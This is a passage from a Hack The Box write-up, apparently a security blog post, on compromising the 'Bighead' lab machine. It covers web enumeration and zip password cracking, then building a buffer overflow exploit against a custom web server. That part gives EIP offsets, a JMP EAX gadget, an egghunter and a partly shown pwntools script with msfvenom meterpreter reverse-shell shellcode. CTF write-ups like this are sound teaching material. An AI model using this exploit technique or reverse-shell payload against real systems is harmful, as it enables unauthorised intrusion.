<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Bighead - Hack The Box - hackcommander.io</title>
<meta name="description" content="Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We then need to exploit a buffer overflow in the HEAD requests by creating a custom exploit. After getting a shell, there’s some pivoting involved to access a limited SSH server, then an LFI to finally get a shell as SYSTEM. For the final stretch there is an NTFS alternate data stream with a Keepass file that contains the final flag.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Bighead - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-bighead/">


  <meta property="og:description" content="Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We then need to exploit a buffer overflow in the HEAD requests by creating a custom exploit. After getting a shell, there’s some pivoting involved to access a limited SSH server, then an LFI to finally get a shell as SYSTEM. For the final stretch there is an NTFS alternate data stream with a Keepass file that contains the final flag.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-bighead/bighead_logo.png">





  <meta property="article:published_time" content="2019-05-04T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-bighead/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Bighead - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Bighead - Hack The Box">
    <meta itemprop="description" content="Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We then need to exploit a buffer overflow in the HEAD requests by creating a custom exploit. After getting a shell, there’s some pivoting involved to access a limited SSH server, then an LFI to finally get a shell as SYSTEM. For the final stretch there is an NTFS alternate data stream with a Keepass file that contains the final flag.">
    <meta itemprop="datePublished" content="May 04, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Bighead - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-05-04T00:00:00+02:00">May 04, 2019 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-bighead/bighead_logo.png" alt="" /></p>

<p>Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We then need to exploit a buffer overflow in the HEAD requests by creating a custom exploit. After getting a shell, there’s some pivoting involved to access a limited SSH server, then an LFI to finally get a shell as SYSTEM. For the final stretch there is an NTFS alternate data stream with a Keepass file that contains the final flag.</p>

<p>This box took the big part of my weekend when it came out but unfortunately I didn’t keep detailed notes about everything. It was especially hard going back when doing this writeup and remember about the 418 status code and the registry key for the SSH password. Note to self: Always clean-up my notes after doing a box.</p>

<p>The exploit part is especially tricky since there isn’t a lot of buffer space to work with so I had to put my second stage payload in memory first with a POST request then use an egghunter for the first stage payload. There’s also another way to exploit this software without using an egghunter: We can use the <code class="language-plaintext highlighter-rouge">LoadLibrary</code> function to remotely load a .dll from our machine over SMB. I’ll try to cover both in this blog post.</p>

<h2 id="summary">Summary</h2>

<ul>
  <li>Find the <code class="language-plaintext highlighter-rouge">code.bighead.htb</code> sub-domain after dirbusting the main website</li>
  <li>Enumerate <code class="language-plaintext highlighter-rouge">code.bighead.htb</code>, find reference to <code class="language-plaintext highlighter-rouge">dev.bighead.htb</code> in one of the note file</li>
  <li>Find the BigheadWebSvr 1.0 webserver running by checking the <code class="language-plaintext highlighter-rouge">coffee</code> directory</li>
  <li>Search github and find that we can download the source code for the BigheadWebSvr webserver</li>
  <li>Analyse the binary and determine that it is vulnerable to a buffer overflow in HEAD requests</li>
  <li>Develop a working exploit locally on a 32 bits Windows 7 machine</li>
  <li>Adapt the exploit so it works through the Nginx reverse proxy</li>
  <li>Get a working reverse shell with the exploit and a metepreter payload</li>
  <li>Find a local SSH service listening on port 2020 then set up port forwarding to reach it</li>
  <li>Find the nginx SSH credentials by looking in the registry then log in to bvshell</li>
  <li>Find an LFI vulnerability in the Testlink application then use it to get a shell as NT AUTHORITY\SYSTEM</li>
  <li>Get the user.txt flag and find that the root.txt is accessible but contains a troll</li>
  <li>Notice that Keepass is installed and that the configuration file contains a keyfile name and database file of root.txt</li>
  <li>Find that there is an NTFS alternate data stream in the root.txt file that contains the hidden Keepass database file</li>
  <li>Download the admin.png keyfile, extract the hidden stream, extract the hash from the database file and crack it with John The Ripper</li>
  <li>Open the Keepass database file with the keyfile and password, then recover the root.txt hash from the database</li>
</ul>

<h2 id="tools-used">Tools used</h2>

<ul>
  <li>Immunity Debugger &amp; x96dbg</li>
  <li>Metasploit</li>
  <li>keepass2john</li>
  <li>John The Ripper</li>
</ul>

<h3 id="portscan">Portscan</h3>

<p>There’s a single port open and Nginx is listening on it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.112
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 21:03 EDT
Nmap scan report for bighead.htb (10.10.10.112)
Host is up (0.0076s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0
|_http-server-header: nginx/1.14.0
|_http-title: PiperNet Comes
</code></pre></div></div>

<h3 id="website-enumeration-bigheadhtb">Website enumeration: bighead.htb</h3>

<p>The main website is a company front page with a contact form at the bottom.</p>

<p><img src="/assets/images/htb-writeup-bighead/webpage.png" alt="" /></p>

<p>I tried checking the contact form for any stored XSS but I couldn’t find any.</p>

<p>A quick scan with gobuster reveals interesting directories: <code class="language-plaintext highlighter-rouge">/backend</code> and <code class="language-plaintext highlighter-rouge">/updatecheck</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u http://bighead.htb
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/Images (Status: 301)
/assets (Status: 301)
/backend (Status: 302)
/images (Status: 301)
/updatecheck (Status: 302)
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">backend</code> simply redirects to <code class="language-plaintext highlighter-rouge">http://bighead.htb/BigHead</code> and returns a 404 error.</p>

<p><img src="/assets/images/htb-writeup-bighead/404.png" alt="" /></p>

<p>However <code class="language-plaintext highlighter-rouge">/updatecheck</code> redirects to <code class="language-plaintext highlighter-rouge">http://code.bighead.htb/phpmyadmin/phpinfo.php</code>, so I’ll add that sub-domain to the list of stuff to enumerate.</p>

<p><img src="/assets/images/htb-writeup-bighead/code.png" alt="" /></p>

<p>After adding the sub-domain I can get to the page and it returns a <code class="language-plaintext highlighter-rouge">phpinfo()</code> output.</p>

<p><img src="/assets/images/htb-writeup-bighead/phpadmin.png" alt="" /></p>

<p>I know the box is running <code class="language-plaintext highlighter-rouge">Windows Server 2008</code> and that it’s 32 bits.</p>

<h3 id="website-enumeration-codebigheadhtb">Website enumeration: code.bighead.htb</h3>

<p>If I try to browse <code class="language-plaintext highlighter-rouge">http://code.bighead.htb/</code> I’m redirected to <code class="language-plaintext highlighter-rouge">http://code.bighead.htb/testlink/</code> which has another javascript redirect script to <code class="language-plaintext highlighter-rouge">http://127.0.0.1:5080/testlink/</code>.</p>

<p>Further enumeration with gobuster:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 25 -u http://code.bighead.htb | grep -vi index
2018/11/24 14:54:15 Starting gobuster

/images (Status: 301)
/img (Status: 301)
/assets (Status: 301)
/mail (Status: 301)
/dev (Status: 301)
/phpmyadmin (Status: 301)
/webalizer (Status: 301)
/dashboard (Status: 301)
/xampp (Status: 301)
/licenses (Status: 301)
/server-status (Status: 200)
/con (Status: 403)
/aux (Status: 403)
/error_log (Status: 403)
/prn (Status: 403)
/server-info (Status: 200)
</code></pre></div></div>

<p>A couple interesting directories like <code class="language-plaintext highlighter-rouge">phpmyadmin</code>, <code class="language-plaintext highlighter-rouge">dashboard</code> and <code class="language-plaintext highlighter-rouge">xampp</code> but the apps are broken by design and I can’t do anything with them. I got some info about the server architecture from <code class="language-plaintext highlighter-rouge">http://code.bighead.htb/server-info?config</code> but that’s about it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server Version: Apache/2.4.33 (Win32) OpenSSL/1.0.2o PHP/5.6.36
Server Architecture: 32-bit
</code></pre></div></div>

<p>It’s interesting to note that the initial nmap scan found Nginx running on port 80 but here I have Apache running. That means Nginx is probably acting as a reverse proxy or load-balancer in front of Apache.</p>

<p>Next, I enumerated the <code class="language-plaintext highlighter-rouge">/testlink</code> directory I found earlier and got the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u http://code.bighead.htb/testlink -s 200
/LICENSE (Status: 200)
/ChangeLog (Status: 200)
/Index (Status: 200)
/changelog (Status: 200)
/error (Status: 200)
/index (Status: 200)
/license (Status: 200)
/linkto (Status: 200)
/note (Status: 200)
/plugin (Status: 200)
[...]
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">note</code> file is very interesting as it contains a hint:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BIGHEAD! You F%*#ing R*#@*d!

STAY IN YOUR OWN DEV SUB!!!...

You have literally broken the code testing app and tools I spent all night building for Richard!

I don't want to see you in my code again!

Dinesh.
</code></pre></div></div>

<p>So Bighead broke the app and Dinesh is telling him to get his own <strong>DEV</strong> sub-domain, maybe I should check if <code class="language-plaintext highlighter-rouge">dev.bighead.htb</code> exists…</p>

<p>So after adding this sub-domain to the local hostfile, I can access a new page:</p>

<p><img src="/assets/images/htb-writeup-bighead/bighead.png" alt="" /></p>

<h3 id="website-enumeration-devbigheadhtb">Website enumeration: dev.bighead.htb</h3>

<p>Anything that has the word <code class="language-plaintext highlighter-rouge">blog</code> and <code class="language-plaintext highlighter-rouge">wp-content</code> in it hits an nginx rule and returns a false positive for anything that contains that. I didn’t find anything when I ran gobuster but dirb found the <code class="language-plaintext highlighter-rouge">/coffee</code> directory because it looks for more status codes by default.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># dirb http://dev.bighead.htb

GENERATED WORDS: 4612

---- Scanning URL: http://dev.bighead.htb/ ----
+ http://dev.bighead.htb/blog (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_ajax (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_inlinemod (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_report (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_search (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_usercp (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blogger (CODE:302|SIZE:161)
+ http://dev.bighead.htb/bloggers (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blogindex (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blogs (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blogspot (CODE:302|SIZE:161)
+ http://dev.bighead.htb/coffee (CODE:418|SIZE:46)
+ http://dev.bighead.htb/wp-content (CODE:302|SIZE:161)
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">/coffee</code> directory contains a funny teapot 418 error message.</p>

<p><img src="/assets/images/htb-writeup-bighead/coffee.png" alt="" /></p>

<p>I also see it’s running a different webserver: <code class="language-plaintext highlighter-rouge">BigheadWebSvr 1.0</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># curl --head dev.bighead.htb/coffee
HTTP/1.1 200 OK
Date: Tue, 27 Nov 2018 02:20:48 GMT
Content-Type: text/html
Content-Length: 13456
Connection: keep-alive
Server: BigheadWebSvr 1.0
</code></pre></div></div>

<p>Google shows a github repository for that software: <a href="https://github.com/3mrgnc3/BigheadWebSvr">https://github.com/3mrgnc3/BigheadWebSvr</a></p>

<p><img src="/assets/images/htb-writeup-bighead/git1.png" alt="" /></p>

<p>I download <code class="language-plaintext highlighter-rouge">BHWS_Backup.zip</code> and saw that the zip file was encrypted. I can extract the hash and crack it with John:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># zip2john BHWS_Backup.zip &gt; hash.txt
BHWS_Backup.zip-&gt;BHWS_Backup/ is not encrypted!
BHWS_Backup.zip-&gt;BHWS_Backup/conf/ is not encrypted!
# cat hash.txt
BHWS_Backup.zip:$zip2$*0*3*0*231ffea3729caa2f37a865b0dca373d7*d63f*49*61c6e7d2949fb22573c57dec460346954bba23dffb11f1204d4a6bc10e91b4559a6b984884fcb376ea1e2925b127b5f6721c4ef486c481738b94f08ac09df30c30d2ae3eb8032c586f*28c1b9eb8b0e1769b4d3*$/zip2$:::::BHWS_Backup.zip
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
2 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s
3 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s
4 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s
thepiedpiper89   (BHWS_Backup.zip)
1 1g 0:00:00:00 DONE (2018-11-26 21:41) 100.0g/s 100.0p/s 100.0c/s 100.0C/s thepiedpiper89
Waiting for 3 children to terminate
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<p>Password is : <code class="language-plaintext highlighter-rouge">thepiedpiper89</code></p>

<p>The archive contains the following files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rw-r--r-- 1 root root   75 Jul 14  2018 BigheadWebSvr_exe_NOTICE.txt
drwx------ 2 root root 4096 Jul  2  2018 conf
-rw-r--r-- 1 root root 1103 Jun 23  2018 fastcgi.conf
-rw-r--r-- 1 root root 1032 Jun 23  2018 fastcgi_params
-rw-r--r-- 1 root root 2946 Jun 23  2018 koi-utf
-rw-r--r-- 1 root root 2326 Jun 23  2018 koi-win
-rw-r--r-- 1 root root 5265 Jun 23  2018 mime.types
-rw-r--r-- 1 root root 4523 Jul  2  2018 nginx.conf
-rw-r--r-- 1 root root  653 Jun 23  2018 scgi_params
-rw-r--r-- 1 root root  681 Jun 23  2018 uwsgi_params
-rw-r--r-- 1 root root 3736 Jun 23  2018 win-utf
</code></pre></div></div>

<p>The .exe in the archive was replaced with a note instead:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat BigheadWebSvr_exe_NOTICE.txt
I removed this vulnerable crapware from the archive

love
Gilfoyle... :D
</code></pre></div></div>

<p>The file history on Github shows an older copy of the zip file:</p>

<p><img src="/assets/images/htb-writeup-bighead/git2.png" alt="" /></p>

<p>I downloaded the file then tried to extract it but the password is not <code class="language-plaintext highlighter-rouge">thepiedpiper89</code>. I cracked the password again and found the older commit uses <code class="language-plaintext highlighter-rouge">bighead</code> as the archive password. After extracting the file I can see there is a <code class="language-plaintext highlighter-rouge">BigheadWebSvr.exe</code> binary in there instead of the note.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ls -l
total 132
-rw-r--r-- 1 root root 28540 Jul  2 16:33 bHeadSvr.dll
drwx------ 2 root root  4096 Jul  2 19:56 BHWS_Backup
-rw-r--r-- 1 root root 51431 Jul  2 16:33 BigheadWebSvr.exe
drwx------ 2 root root  4096 Jul  2 19:57 conf
-rw-r--r-- 1 root root  1103 Jun 23 11:50 fastcgi.conf
-rw-r--r-- 1 root root  1032 Jun 23 11:50 fastcgi_params
-rw-r--r-- 1 root root  2946 Jun 23 11:50 koi-utf
-rw-r--r-- 1 root root  2326 Jun 23 11:50 koi-win
-rw-r--r-- 1 root root  5265 Jun 23 11:50 mime.types
-rw-r--r-- 1 root root  4523 Jul  2 15:34 nginx.conf
-rw-r--r-- 1 root root   653 Jun 23 11:50 scgi_params
-rw-r--r-- 1 root root   681 Jun 23 11:50 uwsgi_params
-rw-r--r-- 1 root root  3736 Jun 23 11:50 win-utf
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># file BigheadWebSvr.exe 
BigheadWebSvr.exe: PE32 executable (console) Intel 80386, for MS Windows
</code></pre></div></div>

<p>There is also an nginx config file which shows the following interesting stuff:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location / {
			# Backend server to forward requests to/from
			proxy_pass          http://127.0.0.1:8008;
			proxy_cache_convert_head off;
			proxy_cache_key $scheme$proxy_host$request_uri$request_method;
			proxy_http_version  1.1;
			
			# adds gzip
			gzip_static on;		
		}

location /coffee {
			# Backend server to forward requests to/from
			#rewrite /coffee /teapot/ redirect;
			#return 418;
			proxy_pass          http://127.0.0.1:8008;
			proxy_cache_convert_head off;
			proxy_intercept_errors off;
			proxy_cache_key $scheme$proxy_host$request_uri$request_method;
			proxy_http_version  1.1;
			proxy_pass_header Server;
			# adds gzip
			gzip_static on;		
		}
</code></pre></div></div>

<p>So, both requests to <code class="language-plaintext highlighter-rouge">/</code> and <code class="language-plaintext highlighter-rouge">/coffee</code> on dev.bighead.htb are served by that crap custom webserver but only <code class="language-plaintext highlighter-rouge">/coffee</code> reveals the server header because of the <code class="language-plaintext highlighter-rouge">proxy_pass_header Server</code> config file.</p>

<h3 id="exploit-development-method-1-using-egghunter">Exploit development (Method #1 using egghunter)</h3>

<p>After opening the .exe file in IDA Free, I saw that the binary was compiled with Mingw. From what I googled, none of the protections like DEP/NX are enabled by default when compiling with mingw so that should make exploitation easier.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/mingw.png" alt="" /></p>

<p>The main function sets up up the socket listener and creates a <code class="language-plaintext highlighter-rouge">ConnectionHandler</code> thread when it receives a connection:</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/connectionhandler.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">ConnectionHandler</code> has multiple branches for the different HTTP methods. The <code class="language-plaintext highlighter-rouge">HEAD</code> request calls the <code class="language-plaintext highlighter-rouge">Function4</code> function.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/head.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/function4.png" alt="" /></p>

<p>The function uses an insecure <code class="language-plaintext highlighter-rouge">strcpy</code> to move data around so it’s possible there is a buffer overflow.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/strcpy.png" alt="" /></p>

<p>I used the open-source <a href="https://x64dbg.com/">x32/64dbg</a> debugger to debug the software.</p>

<p>I setup a breakpoint at the end of <code class="language-plaintext highlighter-rouge">Function4</code> just before it returns.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/breakpoint.png" alt="" /></p>

<p>First, I test with a small payload that should not crash the server just to see if it catches the breakpoint and what the memory layout looks like.</p>

<p><code class="language-plaintext highlighter-rouge">curl --head http://172.23.10.186:8008/AAAAAAAAAAAAAA</code></p>

<p>The program stops at the breakpoint and <code class="language-plaintext highlighter-rouge">EAX</code> contains the memory address where the HEAD request is located.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/normal.png" alt="" /></p>

<p>The memory at <code class="language-plaintext highlighter-rouge">0x175FB28</code> contains part of the HEAD request.</p>

<p>Next, I try sending 100 bytes and see if I can crash the program.</p>

<p><code class="language-plaintext highlighter-rouge">curl --head http://172.23.10.186:8008/$(python -c 'print "A"*100')</code></p>

<p>The program crashes, and I can see that the <code class="language-plaintext highlighter-rouge">EIP</code> register was overwritten by <code class="language-plaintext highlighter-rouge">AAAAAAAA</code> which is not a valid address here.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/crash.png" alt="" /></p>

<p>Next I have to find the exact amount of data to push to overwrite EIP. After I few minutes I was able to find the exact offset:</p>

<p><code class="language-plaintext highlighter-rouge">curl --head http://172.23.10.186:8008/$(python -c 'print(("A"*72)+("B"*8))')</code></p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/offset.png" alt="" /></p>

<p>I used mona in Immunity Debugger to confirm that no protection are enabled on <code class="language-plaintext highlighter-rouge">BigheadWebSvr.exe</code></p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/protections.png" alt="" /></p>

<p>Now I need to redirect the execution of the program to the <code class="language-plaintext highlighter-rouge">EAX</code> register value since this is where my payload will be located. I will use mona to look for gadgets in the program that I can use to jump to. Specifically, I’m looking for the memory address of a <code class="language-plaintext highlighter-rouge">JMP EAX</code> instruction.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/jmpeax.png" alt="" /></p>

<p>I found a gadget at address <code class="language-plaintext highlighter-rouge">0x625012f2</code> in the bHeadSvr.dll. No protection is enabled on this DLL.</p>

<p>To test, I’ll replace <code class="language-plaintext highlighter-rouge">BBBBBBBB</code> from my payload with the memory address of the <code class="language-plaintext highlighter-rouge">JMP EAX</code>. Notice the address is in the reverse order to respect the endianess.</p>

<p><code class="language-plaintext highlighter-rouge">curl --head http://172.23.10.186:8008/$(python -c 'print(("A"*72)+("f2125062"))')</code></p>

<p>After the function returns, the <code class="language-plaintext highlighter-rouge">EIP</code> points to the <code class="language-plaintext highlighter-rouge">JMP EAX</code> instruction.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/jmpeax2.png" alt="" /></p>

<p>Then it jumps to the memory address of <code class="language-plaintext highlighter-rouge">EAX</code>. We see here we only have 36 bytes of buffer space to work with.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/jmpeax3.png" alt="" /></p>

<p>I’ll align the stack first by pushing and popping the <code class="language-plaintext highlighter-rouge">EAX</code> value into <code class="language-plaintext highlighter-rouge">ESP</code>. To find the opcode for this I used <code class="language-plaintext highlighter-rouge">nasm_shell.rb</code> from Metasploit:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm &gt; push eax
00000000  50                push eax
nasm &gt; pop esp
00000000  5C                pop esp
</code></pre></div></div>

<p>Edit: In retrospect I don’t this part was required for this exploit, the exploit should have worked anyways because it doesn’t push/pop stuff off the stack.</p>

<p>Since I don’t have much buffer space to work with I’ll use a 32 bytes egghunter. Basically the egghunter is a small shellcode that looks for a marker (the egg) in memory and jumps to it when it finds it. This is the first stage of the exploit, the 2nd stage will be the rest of the shellcode we want to execute and we’ll need to place it in memory with another HTTP request. Mona can generate the code for the egghunter. By default it uses the string <code class="language-plaintext highlighter-rouge">w00t</code> for the egg.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/egghunter.png" alt="" /></p>

<p>The first stage payload is:</p>
<ul>
  <li>Align stack</li>
  <li>Egghunter shellcode</li>
  <li>JMP EAX</li>
</ul>

<p>The second stage payload is:</p>
<ul>
  <li>w00tw00t (egg)</li>
  <li>meterpreter payload</li>
</ul>

<p>The exploit tested locally on my Win7 VM is shown here:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="s">'''
# msfvenom -p windows/meterpreter/reverse_tcp -b </span><span class="se">\x00\x0a\x0d</span><span class="s"> -f python LHOST=172.23.10.39 LPORT=80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of python file: 1772 bytes
'''</span>

<span class="n">egg</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x77\x30\x30\x74</span><span class="s">"</span> <span class="c1"># w00t
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egg</span> <span class="o">+</span> <span class="n">egg</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xbf\x33\x30\xf9\x54\xdd\xc2\xd9\x74\x24\xf4\x5a\x29</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc9\xb1\x56\x31\x7a\x13\x83\xea\xfc\x03\x7a\x3c\xd2</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x0c\xa8\xaa\x90\xef\x51\x2a\xf5\x66\xb4\x1b\x35\x1c</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xbc\x0b\x85\x56\x90\xa7\x6e\x3a\x01\x3c\x02\x93\x26</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xf5\xa9\xc5\x09\x06\x81\x36\x0b\x84\xd8\x6a\xeb\xb5</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x12\x7f\xea\xf2\x4f\x72\xbe\xab\x04\x21\x2f\xd8\x51</span><span class="s">"</span>
